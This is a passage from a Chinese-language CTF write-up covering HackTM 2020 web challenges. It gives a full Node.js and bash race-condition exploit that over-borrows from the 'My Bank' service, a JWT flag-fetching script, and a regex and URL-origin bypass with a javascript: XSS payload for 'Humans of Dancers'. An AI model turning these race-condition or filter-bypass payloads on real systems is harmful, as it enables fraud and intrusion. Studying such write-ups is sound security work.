class="line">&#125;</span><br><span class="line"></span><br><span class="line">resp = requests.post(url+<span class="string">"/init"</span>, json=data)</span><br><span class="line">token = resp.json()[<span class="string">'data'</span>][<span class="string">'token'</span>]</span><br><span class="line">print(token)</span><br><span class="line">jwt_claim = jwt.decode(token, verify=<span class="literal">False</span>, algorithms=[<span class="string">'HS256'</span>])</span><br><span class="line"><span class="keyword">assert</span> jwt_claim[<span class="string">'id'</span>] == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">resp = requests.get(url+<span class="string">"/flag"</span>, headers=&#123;<span class="string">"Authorization"</span>: <span class="string">"Bearer %s"</span> % token&#125;)</span><br><span class="line">print(resp.json())</span><br></pre></td></tr></table></figure>
+
+<h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-ctftime-org-writeup-18186"><a href="#https-ctftime-org-writeup-18186" class="headerlink" title="https://ctftime.org/writeup/18186"></a><a href="https://ctftime.org/writeup/18186" target="_blank" rel="noopener">https://ctftime.org/writeup/18186</a></h6><h6 id="https-spotless-tech-hacktm-2020-drawing-html"><a href="#https-spotless-tech-hacktm-2020-drawing-html" class="headerlink" title="https://spotless.tech/hacktm-2020-drawing.html"></a><a href="https://spotless.tech/hacktm-2020-drawing.html" target="_blank" rel="noopener">https://spotless.tech/hacktm-2020-drawing.html</a></h6><h5 id="0x02-My-Bank"><a href="#0x02-My-Bank" class="headerlink" title="0x02 My Bank"></a>0x02 My Bank</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Who’s got my money?</span><br><span class="line">Please abstain from brute-forcing files.</span><br><span class="line">http://178.128.175.6:50090/</span><br><span class="line">Author: nytr0gen</span><br></pre></td></tr></table></figure>
+
+<h6 id="通过条件竞争漏洞我们可以借超过600-00-tBTC从而购买flag。"><a href="#通过条件竞争漏洞我们可以借超过600-00-tBTC从而购买flag。" class="headerlink" title="通过条件竞争漏洞我们可以借超过600.00 tBTC从而购买flag。"></a>通过条件竞争漏洞我们可以借超过<code>600.00 tBTC</code>从而购买<code>flag</code>。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exploit.js</span></span><br><span class="line"><span class="keyword">const</span> request = <span class="built_in">require</span>(<span class="string">'request'</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">solve</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    request(<span class="string">'http://178.128.175.6:50090/register'</span>, (err, res, body) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">        request(<span class="string">'http://178.128.175.6:50090/register'</span>, &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">            <span class="string">"headers"</span>: &#123;</span><br><span class="line">                <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;username=posix"</span></span><br><span class="line">        &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">            request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,(err, res, body) =&gt; &#123;</span><br><span class="line">                <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">let</span> queue = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; ++i) &#123;</span><br><span class="line">                    queue += <span class="number">1</span>;</span><br><span class="line">                    request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                        <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">                        <span class="string">"headers"</span>: &#123;</span><br><span class="line">                            <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                            <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;loan=100"</span></span><br><span class="line">                    &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                        queue -= <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">if</span> (queue === <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">                            request(<span class="string">'http://178.128.175.6:50090/'</span>, &#123;</span><br><span class="line">                                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                                <span class="keyword">let</span> money = <span class="regexp">/Money: ([^ ]+)/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">                                money = <span class="built_in">parseInt</span>(money.replace(<span class="regexp">/,/g</span>, <span class="string">''</span>))</span><br><span class="line">                                <span class="keyword">if</span> (money &gt;= <span class="number">1400</span>) &#123;</span><br><span class="line">                                    get_flag(cookie);</span><br><span class="line">                                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                    <span class="built_in">console</span>.log(<span class="string">'[*] Trying, Got '</span> + money);</span><br><span class="line">                                    solve();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;)</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params">cookie</span>) </span>&#123;</span><br><span class="line">    request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">        <span class="string">"headers"</span>: &#123;</span><br><span class="line">            <span class="string">"Cookie"</span>: cookie</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> token = <span class="regexp">/csrf_token.+value="([^"]+)"/</span>.exec(body)[<span class="number">1</span>];</span><br><span class="line">        request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">            <span class="string">"method"</span>: <span class="string">"POST"</span>,</span><br><span class="line">            <span class="string">"headers"</span>: &#123;</span><br><span class="line">                <span class="string">"Cookie"</span>: cookie,</span><br><span class="line">                <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"body"</span>: <span class="string">"csrf_token="</span> + token + <span class="string">"&amp;item=1337"</span></span><br><span class="line">        &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">            <span class="keyword">let</span> cookie = res.headers[<span class="string">'set-cookie'</span>][<span class="number">0</span>].split(<span class="string">';'</span>)[<span class="number">0</span>];</span><br><span class="line">            request(<span class="string">'http://178.128.175.6:50090/store'</span>, &#123;</span><br><span class="line">                <span class="string">"headers"</span>: &#123;</span><br><span class="line">                    <span class="string">"Cookie"</span>: cookie</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;, (err, res, body) =&gt; &#123;</span><br><span class="line">                <span class="keyword">let</span> flag = <span class="regexp">/HackTM&#123;.*&#125;/</span>.exec(body)[<span class="number">0</span>];</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"[!] flag is "</span> + flag);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">solve();</span><br></pre></td></tr></table></figure>
+
+<h6 id="bash的脚本"><a href="#bash的脚本" class="headerlink" title="bash的脚本"></a>bash的脚本</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">url=<span class="string">"http://178.128.175.6:50090/"</span></span><br><span class="line">ua=<span class="string">"User-Agent: Mozilla/5.0"</span></span><br><span class="line">cookie=<span class="string">"session=.eJwNy0sKAjEMANC7ZG1hmmTy8TLStAmIoKDOSry7vv37wHw96_J-3PIOZwhCNNlimhOPlTor3IYOWjkijbOHFBac4Diu6z-Ute9SvWGZNaaNm3tko4mdQnRXF_j-AEMAHN8.Xjaggw.o-B9vO_i0Fnredto0K7aoEXTCGI"</span></span><br><span class="line">ssrf=`curl -s <span class="string">"<span class="variable">$url</span>"</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> 2&gt;&amp;1 | pcregrep -o1 <span class="string">'name=\"csrf_token\" type=\"hidden\" value=\"(.*)\"'</span> -`</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 15`; </span><br><span class="line">    <span class="keyword">do</span> curl <span class="string">"<span class="variable">$url</span>"</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> --data <span class="string">"csrf_token=<span class="variable">$ssrf</span>&amp;loan=100"</span> &amp;</span><br><span class="line">; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">sleep 6 &amp;&amp; <span class="built_in">echo</span> <span class="string">"[*] maybe haxed?"</span> &amp;&amp; curl -s <span class="string">'http://178.128.175.6:50090/'</span> -H <span class="string">"<span class="variable">$ua</span>"</span> -H <span class="string">"Cookie: <span class="variable">$cookie</span>"</span> 2&gt;&amp;1 | pcregrep -o1 <span class="string">"Money: (.*) tBTC"</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-spotless-tech-hacktm-2020-My-20Bank-html"><a href="#https-spotless-tech-hacktm-2020-My-20Bank-html" class="headerlink" title="https://spotless.tech/hacktm-2020-My%20Bank.html"></a><a href="https://spotless.tech/hacktm-2020-My%20Bank.html" target="_blank" rel="noopener">https://spotless.tech/hacktm-2020-My%20Bank.html</a></h6><h6 id="https-blog-rwx-kr-hacktm-ctf-quals-2020-my-bank"><a href="#https-blog-rwx-kr-hacktm-ctf-quals-2020-my-bank" class="headerlink" title="https://blog.rwx.kr/hacktm-ctf-quals-2020/#my-bank"></a><a href="https://blog.rwx.kr/hacktm-ctf-quals-2020/#my-bank" target="_blank" rel="noopener">https://blog.rwx.kr/hacktm-ctf-quals-2020/#my-bank</a></h6><h5 id="0x03-Humans-of-Dancers"><a href="#0x03-Humans-of-Dancers" class="headerlink" title="0x03 Humans of Dancers"></a>0x03 Humans of Dancers</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please do not brute-force for any files or directories.</span><br><span class="line">Recommended browser: Chrome</span><br><span class="line">http://178.128.175.6:20900/</span><br></pre></td></tr></table></figure>
+
+<h6 id="view-source-http-178-128-175-6-20900-static-app-js"><a href="#view-source-http-178-128-175-6-20900-static-app-js" class="headerlink" title="view-source:http://178.128.175.6:20900/static/app.js"></a><code>view-source:http://178.128.175.6:20900/static/app.js</code></h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(location);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> DEFAULT_ROUTE = <span class="string">'/page/acasa'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> $page = $(<span class="string">'.page'</span>);</span><br><span class="line"><span class="keyword">var</span> $pageFrame = $page.find(<span class="string">'.page__frame'</span>);</span><br><span class="line"><span class="keyword">var</span> currentRoute = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isValidUrl = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((url.toLowerCase().startsWith(<span class="string">'//'</span>))) &#123;</span><br><span class="line">        url = <span class="string">"https:"</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> isValidUrl = isValidJSURL(url);</span><br><span class="line">    <span class="keyword">let</span> isUrl = isValidPattern(url);</span><br><span class="line">    <span class="keyword">let</span> sameDomain = url.toLowerCase().startsWith(<span class="string">'/'</span>) &amp;&amp; !url.substr(<span class="number">1</span>).toLowerCase().startsWith(<span class="string">'/'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = ((isValidUrl &amp;&amp; isUrl) || sameDomain);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> expression = <span class="regexp">/^(https?\:\/\/)?[a-zA-Z0-9_-]+(.[a-zA-Z0-9_-]+)*.[a-zA-Z]&#123;2,4&#125;(\/[a-zA-Z0-9_]+)&#123;0,15&#125;(\/[a-zA-Z0-9_]+.[a-zA-Z]&#123;2,4&#125;(\?[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)?)?(\&amp;[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)&#123;0,15&#125;$/gi</span>;</span><br><span class="line"><span class="keyword">var</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(expression);</span><br><span class="line"><span class="keyword">var</span> isValidPattern = <span class="function"><span class="keyword">function</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> urlNoQueryString = url.split(<span class="string">'?'</span>)[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> (url != <span class="literal">null</span> &amp;&amp; !(urlNoQueryString.match(regex) === <span class="literal">null</span> || (url.split(<span class="string">" "</span>).length - <span class="number">1</span>) &gt; <span class="number">0</span>));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> isValidJSURL = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(url.toLowerCase().startsWith(<span class="string">"http://"</span>) || url.toLowerCase().startsWith(<span class="string">'https://'</span>))) &#123;</span><br><span class="line">        url = <span class="string">'https://'</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> toOpenUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toOpenUrl = <span class="keyword">new</span> URL(url);</span><br><span class="line">        <span class="keyword">return</span> toOpenUrl.origin !== <span class="string">'null'</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">window</span>).bind(<span class="string">'hashchange'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// parse hash</span></span><br><span class="line">    <span class="keyword">var</span> hash = location.hash;</span><br><span class="line">    <span class="keyword">if</span> (hash.length &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        hash = hash.slice(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> route = <span class="built_in">decodeURIComponent</span>(hash.split(<span class="string">'@'</span>)[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> (route === <span class="string">''</span> || !isValidUrl(route)) &#123;</span><br><span class="line">        <span class="comment">// goto default page</span></span><br><span class="line">        route = DEFAULT_ROUTE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> scrollToID = hash.match(<span class="regexp">/#([a-z_]+)$/</span>);</span><br><span class="line">    <span class="keyword">if</span> (scrollToID !== <span class="literal">null</span>) &#123;</span><br><span class="line">        scrollToID = scrollToID[<span class="number">0</span>];</span><br><span class="line">        route = route.slice(<span class="number">0</span>, -scrollToID.length);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (route === currentRoute) &#123;</span><br><span class="line">        <span class="keyword">var</span> frame$ = <span class="built_in">window</span>.frames[<span class="number">0</span>].window.$;</span><br><span class="line">        <span class="keyword">var</span> frame$id = frame$(scrollToID);</span><br><span class="line">        <span class="keyword">if</span> (frame$id.length == <span class="number">1</span>) &#123;</span><br><span class="line">            frame$(<span class="string">'html, body'</span>).animate(&#123;</span><br><span class="line">                scrollTop: frame$id.offset().top</span><br><span class="line">            &#125;, <span class="number">400</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $page.removeClass(<span class="string">'page--frame'</span>)</span><br><span class="line">        .removeClass(<span class="string">'page--'</span> + currentRoute)</span><br><span class="line">        .addClass(<span class="string">'page--loading'</span>);</span><br><span class="line"></span><br><span class="line">    $pageFrame.attr(<span class="string">'src'</span>, route);</span><br><span class="line">    $pageFrame.one(<span class="string">'load'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">// if exists show it</span></span><br><span class="line">            currentRoute = route;</span><br><span class="line"></span><br><span class="line">            $page.removeClass(<span class="string">'page--loading'</span>)</span><br><span class="line">                .addClass(<span class="string">'page--frame'</span>)</span><br><span class="line">                .addClass(<span class="string">'page--'</span> + route);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> frame = e.target.contentWindow;</span><br><span class="line">            <span class="keyword">var</span> frame$ = frame.$;</span><br><span class="line">            <span class="keyword">if</span> (!frame$) &#123;</span><br><span class="line">                <span class="comment">// if it doesnt exists show 404</span></span><br><span class="line">                currentRoute = <span class="string">'404'</span>;</span><br><span class="line"></span><br><span class="line">                $page.removeClass(<span class="string">'page--loading'</span>)</span><br><span class="line">                    .addClass(<span class="string">'page--404'</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (scrollToID) &#123;</span><br><span class="line">                <span class="keyword">var</span> frame$id = frame$(scrollToID);</span><br><span class="line">                <span class="keyword">if</span> (frame$id.length == <span class="number">1</span>) &#123;</span><br><span class="line">                    frame$(<span class="string">'html, body'</span>).animate(&#123;</span><br><span class="line">                        scrollTop: frame$id.offset().top</span><br><span class="line">                    &#125;, <span class="number">400</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="number">100</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(<span class="built_in">window</span>).trigger(<span class="string">'hashchange'</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<h6 id="如果您查看-static-app-js文件，它将使用哈希值中给出的字符串作为参数调用isValidUrl函数，并检查它是否为安全地址，然后将其设置为iframe标记的src属性。"><a href="#如果您查看-static-app-js文件，它将使用哈希值中给出的字符串作为参数调用isValidUrl函数，并检查它是否为安全地址，然后将其设置为iframe标记的src属性。" class="headerlink" title="如果您查看/static/app.js文件，它将使用哈希值中给出的字符串作为参数调用isValidUrl函数，并检查它是否为安全地址，然后将其设置为iframe标记的src属性。"></a>如果您查看<code>/static/app.js</code>文件，它将使用哈希值中给出的字符串作为参数调用<code>isValidUrl</code>函数，并检查它是否为安全地址，然后将其设置为iframe标记的src属性。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/^(https?\:\/\/)?[a-zA-Z0-9_-]+(.[a-zA-Z0-9_-]+)*.[a-zA-Z]&#123;2,4&#125;(\/[a-zA-Z0-9_]+)&#123;0,15&#125;(\/[a-zA-Z0-9_]+.[a-zA-Z]&#123;2,4&#125;(\?[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)?)?(\&amp;[a-zA-Z0-9_]+\=[a-zA-Z0-9_]+)&#123;0,15&#125;$/gi</span><br><span class="line">// matches with https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1) ...</span><br></pre></td></tr></table></figure>
+
+<h6 id="首先isUrl使用的正则表达式十分的复杂。这样可以确保字符不会全部转义并匹配所有的字符。因此我可以绕过用https-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-alert-1-。"><a href="#首先isUrl使用的正则表达式十分的复杂。这样可以确保字符不会全部转义并匹配所有的字符。因此我可以绕过用https-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-alert-1-。" class="headerlink" title="首先isUrl使用的正则表达式十分的复杂。这样可以确保字符不会全部转义并匹配所有的字符。因此我可以绕过用https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)。"></a>首先<code>isUrl</code>使用的正则表达式十分的复杂。这样可以确保字符不会全部转义并匹配所有的字符。因此我可以绕过用<code>https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)</code>。</h6><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> isValidJSURL = <span class="function"><span class="keyword">function</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!(url.toLowerCase().startsWith(<span class="string">"http://"</span>) || url.toLowerCase().startsWith(<span class="string">'https://'</span>))) &#123;</span><br><span class="line">        url = <span class="string">'https://'</span> +  url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> toOpenUrl;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        toOpenUrl = <span class="keyword">new</span> URL(url);</span><br><span class="line">        <span class="keyword">return</span> toOpenUrl.origin !== <span class="string">'null'</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h6 id="isValidJSURL函数检查给定的URL的来源。对于https-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-alert-1-起源于javascript-80是被认可的。"><a href="#isValidJSURL函数检查给定的URL的来源。对于https-javascript-80-1-60html-t-aa-b-c-pa-a-1-60-alert-1-起源于javascript-80是被认可的。" class="headerlink" title="isValidJSURL函数检查给定的URL的来源。对于https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)起源于javascript:80是被认可的。"></a><code>isValidJSURL</code>函数检查给定的URL的来源。对于<code>https://javascript:80/1-%60html;t/aa/b/c,pa?a=1%60,alert(1)</code>起源于<code>javascript:80</code>是被认可的。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// csp</span><br><span class="line">Content-Security-Policy: base-uri &apos;self&apos;; block-all-mixed-content; frame-ancestors &apos;self&apos;; object-src &apos;none&apos;; connect-src &apos;self&apos;; frame-src &apos;self&apos; https://www.youtube.com https://www.google.com; script-src &apos;self&apos; &apos;unsafe-inline&apos; https://cdnjs.cloudflare.com https://www.google.com/recaptcha/api.js https://www.gstatic.com/recaptcha/; report-uri /api/report-csp</span><br><span class="line">// app.js</span><br><span class="line">Object.freeze(location);</span><br></pre></td></tr></table></figure>
+
